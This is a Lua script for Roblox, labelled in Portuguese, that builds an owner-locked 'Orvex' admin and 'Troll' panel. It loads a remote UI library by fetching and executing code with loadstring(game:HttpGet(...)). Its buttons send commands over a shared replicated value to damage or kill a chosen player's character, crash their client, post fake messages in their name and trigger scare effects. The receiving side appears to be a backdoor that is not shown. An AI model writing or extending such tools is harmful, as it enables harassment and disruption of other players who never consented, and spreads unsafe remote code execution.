local DONO_USERID = 2980742903
local Players = game:GetService("Players")
local jogador = Players.LocalPlayer

if jogador.UserId ~= DONO_USERID then 
    jogador:Kick("Orvex Security: Acesso negado ao Painel Administrativo.")
    return 
end

local CanalRedeOrvex = game:GetService("RobloxReplicatedStorage"):FindFirstChild("OrvexNetworkComms")
if not CanalRedeOrvex then
    CanalRedeOrvex = Instance.new("StringValue")
    CanalRedeOrvex.Name = "OrvexNetworkComms"
    CanalRedeOrvex.Value = ""
    CanalRedeOrvex.Parent = game:GetService("RobloxReplicatedStorage")
end

local function enviarComandoRede(alvoNome, comando, argumento)
    CanalRedeOrvex.Value = string.format("%s|%s|%s|%s", tostring(alvoNome), tostring(comando), tostring(argumento), tostring(os.clock()))
end

local Rayfield = loadstring(game:HttpGet("https://sirius.menu"))()

local Window = Rayfield:CreateWindow({
    Name = "ORVEX | ADMIN PAINEL",
    Subtitle = "Gerenciamento de Rede",
    Theme = "Default",
    Icon = "rbxassetid://108115485663409",
    ShowName = "Orvex Admin",
    Configuration = { AutoSave = false, AutoLoad = false, FileName = "OrvexAdminConfig" }
})

local TabMonitor = Window:CreateTab({ Name = "Monitor", Icon = "rbxassetid://100604009889706" })
local TabControle = Window:CreateTab({ Name = "Controle", Icon = "rbxassetid://125823673784681" })
local TabTroll = Window:CreateTab({ Name = "Troll", Icon = "rbxassetid://10651147057" })
local TabLogs = Window:CreateTab({ Name = "Logs", Icon = "rbxassetid://91452555903853" })

local usuarioSelecionadoMonitor = ""
local usuarioSelecionadoTroll = ""
local textoFakeMensagem = ""

local function obterListaJogadores()
    local lista = {}
    for _, p in ipairs(Players:GetPlayers()) do table.insert(lista, p.Name) end
    if #lista == 0 then table.insert(lista, "Nenhum usuário detectado") end
    return lista
end

TabMonitor:CreateSection({ Name = "Rastreamento Globais da Sessão" })
local LabelContador = TabMonitor:CreateText({ Name = "Contador", Text = "Usuários conectados na sessão atual: 0" })
TabMonitor:CreateDivider()
local LabelLista = TabMonitor:CreateText({ Name = "Usuários Online", Text = "Aguardando sincronização de rede..." })

local function atualizarMonitorVisual()
    local atualLista = obterListaJogadores()
    LabelContador:Set("Usuários conectados na sessão atual: " .. #Players:GetPlayers())
    LabelLista:Set("Online: " .. table.concat(atualLista, ", "))
end

TabControle:CreateSection({ Name = "Modificadores de Acesso" })
local DropdownControle = TabControle:CreateDropdown({
    Name = "Selecionar Usuário",
    Options = obterListaJogadores(),
    CurrentOption = "",
    MultipleOptions = false,
    Callback = function(opcao) usuarioSelecionadoMonitor = opcao end
})

TabControle:CreateButton({
    Name = "Remover Acesso",
    Callback = function()
        if usuarioSelecionadoMonitor ~= "" and usuarioSelecionadoMonitor ~= "Nenhum usuário detectado" then
            enviarComandoRede(usuarioSelecionadoMonitor, "DesconectarScript", "Acesso revogado pelo Administrador.")
            Window:Notify({Title = "Controle", Content = "Sinal de desligamento enviado para: " .. usuarioSelecionadoMonitor, Duration = 3})
        end
    end
})

TabTroll:CreateSection({ Name = "Seleção de Alvo" })
local DropdownTroll = TabTroll:CreateDropdown({
    Name = "Selecionar Alvo da Rede",
    Options = obterListaJogadores(),
    CurrentOption = "",
    MultipleOptions = false,
    Callback = function(opcao) usuarioSelecionadoTroll = opcao end
})

TabTroll:CreateSection({ Name = "Modificadores de Estado" })
TabTroll:CreateButton({
    Name = "Reduzir Vitalidade",
    Callback = function()
        if usuarioSelecionadoTroll ~= "" and usuarioSelecionadoTroll ~= "Nenhum usuário detectado" then
            enviarComandoRede(usuarioSelecionadoTroll, "Danificar", "25")
        end
    end
})

TabTroll:CreateButton({
    Name = "Eliminar Personagem",
    Callback = function()
        if usuarioSelecionadoTroll ~= "" and usuarioSelecionadoTroll ~= "Nenhum usuário detectado" then
            enviarComandoRede(usuarioSelecionadoTroll, "Danificar", "0")
        end
    end
})

TabTroll:CreateSection({ Name = "1. Simulação de Mensagens (Fake Message)" })
TabTroll:CreateInput({
    Name = "Texto do Discurso",
    PlaceholderText = "Escreva a mensagem falsa aqui...",
    Numeric = false,
    ClearOnFocus = false,
    Callback = function(texto) textoFakeMensagem = texto end
})

TabTroll:CreateButton({
    Name = "Enviar Mensagem Simulada",
    Callback = function()
        if usuarioSelecionadoTroll ~= "" and textoFakeMensagem ~= "" and usuarioSelecionadoTroll ~= "Nenhum usuário detectado" then
            enviarComandoRede(usuarioSelecionadoTroll, "FakeMessage", textoFakeMensagem)
        end
    end
})

TabTroll:CreateSection({ Name = "2. Manipulação de Desempenho (Crash)" })
TabTroll:CreateButton({
    Name = "Provocar Travamento (Crash Client)",
    Callback = function()
        if usuarioSelecionadoTroll ~= "" and usuarioSelecionadoTroll ~= "Nenhum usuário detectado" then
            enviarComandoRede(usuarioSelecionadoTroll, "ForcarCrash", "true")
        end
    end
})

TabTroll:CreateSection({ Name = "3. Modificador de Interface (Susto)" })
TabTroll:CreateToggle({
    Name = "Ativar Efeito Surpresa (Susto)",
    CurrentValue = false,
    Callback = function(valor)
        if usuarioSelecionadoTroll ~= "" and usuarioSelecionadoTroll ~= "Nenhum usuário detectado" then
            enviarComandoRede(usuarioSelecionadoTroll, "EfeitoSusto", valor and "ATIVAR" or "DESATIVAR")
        end
    end
})

TabLogs:CreateSection({ Name = "Histórico de Conexões" })
local ConsoleLogs = TabLogs:CreateConsole({
    Name = "Console de Atividades",
    Text = "[SISTEMA] Conectado e escutando tráfego de dados Orvex...",
    Height = 160,
    Follow = true,
    maxLines = 100
})

task.spawn(function()
    while task.wait(4) do
        pcall(function()
            local alvosNovos = obterListaJogadores()
            DropdownControle:Refresh(alvosNovos)
            DropdownTroll:Refresh(alvosNovos)
            atualizarMonitorVisual()
            ConsoleLogs:Log("[REDE] Conexão com players comuns mantida e sincronizada.")
        end)
    end
end)

Window:Notify({
    Title = "Orvex Admin",
    Content = "Painel isolado e conectado com sucesso!",
    Duration = 4,
    Icon = "rbxassetid://108115485663409"
})
